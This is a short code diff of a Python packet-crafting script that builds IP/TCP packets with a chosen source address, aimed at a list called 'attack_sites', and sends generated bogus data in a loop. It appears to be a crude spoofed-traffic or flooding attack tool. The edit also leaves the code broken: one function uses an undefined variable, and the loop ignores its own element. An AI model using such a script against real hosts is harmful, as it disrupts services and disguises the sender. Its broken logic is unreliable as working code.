@@ -15,21 +15,21 @@ def connect_to_site(dest_ip="0.0.0.0", port=443):
 
 
 def craft_packet(src_ip="0.0.0.0", data=""):
-    reduced_data = list(data)
 
-    for seg_data in reduced_data:
-        print (seg_data)
-        packet = IP(dst=attack_sites[0], src=src_ip) / TCP() / seg_data
-        sleep(1)
+    print (seg_data)
+    packet = IP(dst=attack_sites[0], src=src_ip) / TCP() / seg_data
 
     return packet
 
-def send_packet(src_ip="0.0.0.0", data="", dest_ip="0.0.0.0", port=443):
+def send_packets(src_ip="0.0.0.0", data="", dest_ip="0.0.0.0", port=443):
     socket_connection = connect_to_site(dest_ip, port)
 
-    packet = craft_packet(src_ip, data=data)
-
-    socket_connection.send(bytes(packet))
+    reduced_data = list(data)
+    
+    for d in reduced_data: 
+        packet = craft_packet(src_ip, data=data)
+        socket_connection.send(bytes(packet))
+        sleep(1)
 
 def generate_bogus_data(length_of_data=1000):
     data = ""
@@ -39,4 +39,4 @@ def generate_bogus_data(length_of_data=1000):
 
     return data
 
-#send_packet(src_ip="127.0.0.1", data=generate_bogus_data(), dest_ip=attack_sites[0], port=80)
+#send_packets(src_ip="127.0.0.1", data=generate_bogus_data(), dest_ip=attack_sites[0], port=80)
